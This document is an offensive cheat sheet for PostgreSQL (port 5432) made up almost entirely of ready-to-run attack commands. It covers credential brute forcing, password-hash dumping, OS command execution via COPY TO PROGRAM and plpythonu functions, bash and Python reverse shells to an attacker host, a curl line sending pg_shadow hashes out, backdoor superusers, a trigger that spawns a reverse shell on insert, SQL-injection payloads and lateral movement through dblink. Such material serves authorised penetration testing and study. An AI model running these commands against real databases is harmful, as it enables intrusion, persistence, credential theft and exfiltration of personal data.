# POSTGRESQL ENUMERATION (Port 5432)

## PORT OVERVIEW
```
Port 5432 - PostgreSQL (default)
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p5432 <IP>                            # Service/Version detection
nmap -p5432 --script pgsql-brute <IP>           # Brute force
nc -nv <IP> 5432                                # Manual connection attempt
psql -h <IP> -U postgres                        # Direct connection attempt
```

## NMAP POSTGRESQL ENUMERATION
```bash
nmap --script "pgsql-*" -p5432 <IP>             # All PostgreSQL scripts
nmap --script pgsql-brute -p5432 <IP>           # Brute force
nmap --script pgsql-databases -p5432 <IP>       # List databases (requires auth)
```

## PSQL CLIENT (DIRECT CONNECTION)
```bash
# Connect to PostgreSQL
psql -h <IP> -U postgres                        # Default user
psql -h <IP> -U <USER> -d <DATABASE>            # Specific user and database
psql -h <IP> -U postgres -d postgres            # Postgres database
psql "postgresql://<USER>:<PASSWORD>@<IP>:5432/<DATABASE>"  # Connection string

# Common commands after connection
\l                                              # List databases
\c <database>                                   # Connect to database
\dt                                             # List tables in current database
\du                                             # List users/roles
\dp                                             # List table privileges
\q                                              # Quit
SELECT version();                               # PostgreSQL version
```

## AUTHENTICATION TESTING
```bash
# Test for default credentials
psql -h <IP> -U postgres                        # Empty password
psql -h <IP> -U postgres -W                     # Prompt for password (try: postgres)

# Common default credentials
postgres: (empty)
postgres:postgres
postgres:password
postgres:admin
admin:admin
```

## BRUTE FORCE ATTACKS
```bash
# Hydra
hydra -l postgres -P passwords.txt postgres://<IP>  # Single user
hydra -L users.txt -P passwords.txt postgres://<IP>  # User/pass lists

# Medusa
medusa -h <IP> -u postgres -P passwords.txt -M postgres
medusa -h <IP> -U users.txt -P passwords.txt -M postgres

# Nmap
nmap --script pgsql-brute -p5432 <IP>
nmap --script pgsql-brute --script-args userdb=users.txt,passdb=pass.txt -p5432 <IP>

# Patator
patator pgsql_login host=<IP> user=FILE0 password=FILE1 0=users.txt 1=passwords.txt
```

## ENUMERATE DATABASES
```bash
# After authentication
\l                                              # List all databases
SELECT datname FROM pg_database;                # SQL query to list databases

# Switch to database
\c <database>

# List tables
\dt
SELECT table_name FROM information_schema.tables WHERE table_schema='public';

# List columns
\d <table>
SELECT column_name FROM information_schema.columns WHERE table_name='<table>';
```

## ENUMERATE USERS & ROLES
```bash
# List users
\du
SELECT usename FROM pg_user;                    # All users
SELECT rolname FROM pg_roles;                   # All roles

# Check privileges
SELECT * FROM pg_user WHERE usesuper IS TRUE;   # Superusers
SELECT grantee, privilege_type FROM information_schema.role_table_grants WHERE table_name='<table>';
```

## EXTRACT DATA
```bash
# Dump data from tables
SELECT * FROM <table>;                          # Dump entire table
SELECT username,password FROM users;            # Specific columns

# Search for sensitive data
SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%user%';
SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%password%';

# Extract password hashes
SELECT usename, passwd FROM pg_shadow;          # Password hashes (superuser required)
```

## COMMAND EXECUTION (COPY TO/FROM PROGRAM)
```bash
# PostgreSQL 9.3+ allows command execution via COPY TO/FROM PROGRAM
# Requires superuser or pg_execute_server_program role

# Execute OS command
COPY (SELECT '') TO PROGRAM 'whoami';           # No output visible
COPY (SELECT '') TO PROGRAM 'id > /tmp/output.txt';  # Write output to file

# Read command output
DROP TABLE IF EXISTS cmd_output;
CREATE TABLE cmd_output(cmd_output text);
COPY cmd_output FROM PROGRAM 'whoami';
SELECT * FROM cmd_output;

# Reverse shell
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1"';

# Windows command execution
COPY (SELECT '') TO PROGRAM 'cmd.exe /c whoami > C:\temp\output.txt';
```

## LARGE OBJECTS (FILE READ/WRITE)
```bash
# Read local files using Large Objects (lo_import requires superuser)
SELECT lo_import('/etc/passwd', 12345);         # Import file as large object
SELECT lo_get(12345);                           # Read large object
SELECT lo_export(12345, '/tmp/passwd');         # Export to file

# Write files
SELECT lo_from_bytea(12345, 'file content');    # Create large object from content
SELECT lo_export(12345, '/tmp/output.txt');     # Export to file

# UDF (User Defined Functions) for file operations
CREATE OR REPLACE FUNCTION read_file(text) RETURNS text AS $$
  import os
  return os.popen(args[0]).read()
$$ LANGUAGE plpythonu;

SELECT read_file('cat /etc/passwd');
```

## UDF (USER DEFINED FUNCTIONS) - RCE
```bash
# If plpython is enabled (check with: SELECT * FROM pg_language;)
CREATE OR REPLACE FUNCTION exec(cmd text) RETURNS text AS $$
  import os
  return os.popen(cmd).read()
$$ LANGUAGE plpythonu;

SELECT exec('whoami');

# Reverse shell via UDF
CREATE OR REPLACE FUNCTION reverse_shell() RETURNS void AS $$
  import socket,subprocess,os
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(("<attacker_IP>",4444))
  os.dup2(s.fileno(),0)
  os.dup2(s.fileno(),1)
  os.dup2(s.fileno(),2)
  subprocess.call(["/bin/sh","-i"])
$$ LANGUAGE plpythonu;

SELECT reverse_shell();
```

## CVE-2019-9193 (COPY TO/FROM PROGRAM RCE)
```bash
# PostgreSQL 9.3 to 11.2 RCE via COPY TO/FROM PROGRAM
# Requires authentication (but works with low-privileged user if pg_execute_server_program role granted)

# Exploit
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

## PRIVILEGE ESCALATION
```bash
# Check current user privileges
SELECT current_user;
SELECT session_user;
SELECT usename, usesuper FROM pg_user WHERE usename = current_user;

# Check for superuser
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;  # t = superuser

# Grant superuser (requires superuser)
ALTER USER <username> WITH SUPERUSER;

# Create new superuser
CREATE USER backdoor WITH PASSWORD 'Password123!' SUPERUSER;
```

## FILE OPERATIONS (ALTERNATIVE METHODS)
```bash
# Using COPY TO for file read (if permissions allow)
CREATE TABLE temp(content text);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp;

# Using pg_read_file (PostgreSQL 9.1+, requires superuser)
SELECT pg_read_file('/etc/passwd', 0, 1000000);  # Read up to 1MB

# List directory
SELECT pg_ls_dir('/etc');                       # List directory contents (superuser)

# Check if file exists
SELECT pg_stat_file('/etc/passwd');             # File metadata
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/postgres/postgres_version  # Version detection
use auxiliary/scanner/postgres/postgres_login   # Login scanner
use auxiliary/admin/postgres/postgres_sql       # Execute SQL
use auxiliary/admin/postgres/postgres_readfile  # Read files
use exploit/linux/postgres/postgres_payload     # Payload execution
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec  # CVE-2019-9193
```

## SQLI TO RCE (WEB APPLICATION)
```bash
# If SQL injection in web app
# Enable command execution
'; COPY (SELECT '') TO PROGRAM 'whoami'; --

# Read files
'; COPY temp FROM '/etc/passwd'; --

# Create UDF for RCE
'; CREATE OR REPLACE FUNCTION exec(text) RETURNS text AS $$ import os; return os.popen(args[0]).read() $$ LANGUAGE plpythonu; --
'; SELECT exec('whoami'); --
```

## POSTGRESQL EXTENSIONS
```bash
# List installed extensions
SELECT * FROM pg_available_extensions;

# Check for dangerous extensions
SELECT * FROM pg_extension;

# plpythonu (allows Python code execution)
CREATE EXTENSION plpythonu;

# adminpack (admin functions)
CREATE EXTENSION adminpack;
```

## CONFIGURATION FILES
```bash
# Find configuration file location
SHOW config_file;                               # postgresql.conf location
SHOW hba_file;                                  # pg_hba.conf location
SHOW data_directory;                            # Data directory

# Read pg_hba.conf (authentication config)
SELECT pg_read_file('pg_hba.conf');             # Requires superuser

# Common config file locations
/etc/postgresql/*/main/postgresql.conf          # Debian/Ubuntu
/var/lib/pgsql/data/postgresql.conf             # RedHat/CentOS
C:\Program Files\PostgreSQL\*\data\postgresql.conf  # Windows
```

## PASSWORD HASH DUMPING
```bash
# Dump password hashes (requires superuser)
SELECT usename, passwd FROM pg_shadow;          # MD5 hashes
SELECT rolname, rolpassword FROM pg_authid;     # Alternative

# Crack PostgreSQL hashes
hashcat -m 12 hashes.txt rockyou.txt            # PostgreSQL MD5
john --format=postgres hashes.txt               # John the Ripper
```

## LATERAL MOVEMENT (DBLink)
```bash
# DBLink allows connections to other PostgreSQL servers
CREATE EXTENSION dblink;

# Connect to remote PostgreSQL
SELECT * FROM dblink('host=<remote_IP> user=postgres password=password dbname=postgres', 'SELECT version()') AS t(version text);

# Execute commands on remote server
SELECT dblink_exec('host=<remote_IP> user=postgres password=password', 'CREATE USER backdoor WITH PASSWORD ''pass'' SUPERUSER');
```

## PERSISTENCE
```bash
# Create backdoor user
CREATE USER backdoor WITH PASSWORD 'Password123!' SUPERUSER;
GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO backdoor;

# Create malicious function (triggers on specific query)
CREATE OR REPLACE FUNCTION backdoor_trigger() RETURNS trigger AS $$
BEGIN
  EXECUTE 'COPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/<attacker>/4444 0>&1"''';
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER backdoor AFTER INSERT ON users FOR EACH ROW EXECUTE FUNCTION backdoor_trigger();
```

## COMMON MISCONFIGURATIONS
```
☐ Postgres user with weak/default password
☐ PostgreSQL exposed to internet
☐ Trust authentication in pg_hba.conf (no password required)
☐ Superuser accessible remotely
☐ plpythonu extension enabled
☐ pg_execute_server_program role granted to low-privileged users
☐ Weak password policy
☐ No firewall rules
☐ Old PostgreSQL version (known CVEs)
☐ Logging disabled (activities not monitored)
```

## QUICK WIN CHECKLIST
```
☐ Test for empty postgres password
☐ Test default credentials (postgres:postgres)
☐ Brute force weak passwords
☐ Check PostgreSQL version for known CVEs
☐ Check if user is superuser
☐ Test for COPY TO/FROM PROGRAM (command execution)
☐ Check if plpythonu is enabled (UDF RCE)
☐ Dump password hashes
☐ Search for sensitive data in databases
☐ Test for SQL injection in web apps
☐ Check pg_hba.conf for trust authentication
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick PostgreSQL enumeration
nmap -sV -p5432 --script pgsql-brute <IP>

# With credentials
psql -h <IP> -U postgres -c "SELECT version(); SELECT datname FROM pg_database; SELECT usename FROM pg_user;"
```

## ADVANCED TECHNIQUES
```bash
# PostgreSQL as a pivot point
# Use DBLink to connect to internal PostgreSQL servers

# Blind command execution via timing
SELECT CASE WHEN (SELECT current_user)='postgres' THEN pg_sleep(5) ELSE pg_sleep(0) END;

# Out-of-band data exfiltration
COPY (SELECT passwd FROM pg_shadow) TO PROGRAM 'curl http://<attacker>/?data=$(cat)';
```

## POST-EXPLOITATION (AFTER POSTGRESQL ACCESS)
```bash
# After gaining PostgreSQL access:
1. Check privileges (superuser?)
2. Enumerate databases and tables
3. Extract sensitive data (passwords, PII, credit cards)
4. Dump password hashes (crack offline)
5. Enable command execution (COPY TO PROGRAM or UDF)
6. Execute reverse shell
7. Read sensitive files (/etc/passwd, SSH keys, configs)
8. Lateral movement via DBLink (if available)
9. Create persistence (backdoor user, triggers)
10. Pivot to other systems

# Full database dump
pg_dump -h <IP> -U postgres -d <database> > dump.sql
pg_dumpall -h <IP> -U postgres > all_databases.sql
```
